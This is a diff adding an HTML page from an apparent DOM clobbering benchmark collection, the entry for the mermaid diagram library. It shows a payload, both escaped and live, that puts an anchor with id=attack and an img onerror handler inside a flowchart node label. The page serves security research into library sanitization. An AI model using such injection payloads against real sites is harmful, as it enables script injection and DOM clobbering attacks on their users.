@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM Clobbering Micro Benchmarks</title>
+    <link rel="stylesheet" href="../styles/styles.css">
+    <style>
+        /* Ensure that long lines in <pre> tags wrap */
+        pre {
+            white-space: pre-wrap;       /* CSS3 */
+            white-space: -moz-pre-wrap;  /* Mozilla */
+            white-space: -pre-wrap;      /* Opera 4-6 */
+            white-space: -o-pre-wrap;    /* Opera 7 */
+            word-wrap: break-word;       /* IE */
+        }
+    </style>
+</head>
+<body>
+<h1>DOM Clobbering Collection - mermaid</h1>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Payload</span><br><br>
+  <pre>&lt;pre class=&quot;mermaid&quot;&gt;
+  flowchart TD
+      A[&lt;a id=attack&gt;hello&lt;/a&gt;&lt;img src=a onerror=2+2 &gt;] --&gt;|Get money| B(Go shopping)
+      B --&gt; C{u}
+&lt;/pre&gt;</pre>
+  <pre class="mermaid">
+  flowchart TD
+      A[<a id=attack>hello</a><img src=a onerror=2+2 >] -->|Get money| B(Go shopping)
+      B --> C{u}
+</pre>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Library</span><br><br>
+  <pre>&lt;script type=&quot;module&quot;&gt;
+  import mermaid from &#x27;https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs&#x27;;
+&lt;/script&gt;</pre>
+  <script type="module">
+  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';
+</script>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <a href="../richtexteditor/poc.html">Next: richtexteditor</a>
+  </div>
+</section>
+
+</body>
+</html>
